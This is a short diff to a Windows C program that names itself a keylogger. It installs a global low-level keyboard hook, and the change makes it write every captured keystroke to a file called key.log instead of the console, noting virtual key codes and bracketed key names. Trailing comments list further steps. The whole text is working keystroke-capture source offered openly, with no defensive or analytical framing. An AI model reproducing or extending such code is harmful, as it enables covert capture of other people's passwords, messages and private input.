@@ -4,6 +4,7 @@
 #include <stdbool.h>
 
 HHOOK hookHandle;
+FILE* fp;
 
 LRESULT CALLBACK keylogger(
 	_In_ int    nCode,
@@ -20,7 +21,15 @@ LRESULT CALLBACK keylogger(
 
 			int result = GetKeyNameText(msg, keyText, sizeof(keyText) / sizeof(WCHAR));
 			if (result > 0) {
-				printf("%ls\n", keyText);
+				size_t keyTextLen = wcslen(keyText);
+				if (keyTextLen == 0) {
+					fprintf(fp, "[virtual key code: %d]", kbdStruct.vkCode);
+				} else if (keyTextLen == 1) {
+					fprintf(fp, "%ls", keyText);
+				}
+				else {
+					fprintf(fp, "[%ls]", keyText);
+				}
 			}
 		}
 	}
@@ -29,6 +38,12 @@ LRESULT CALLBACK keylogger(
 };
 
 void main() {
+	errno_t err = fopen_s(&fp, "key.log", "w");
+	if (err != 0) {
+		printf("Error while opening log file %d", err);
+		return;
+	}
+
 	hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger, NULL, 0);
 	
 	MSG msg;
@@ -40,3 +55,5 @@ void main() {
 		}
 	};
 }
+// winmain
+// write to a file
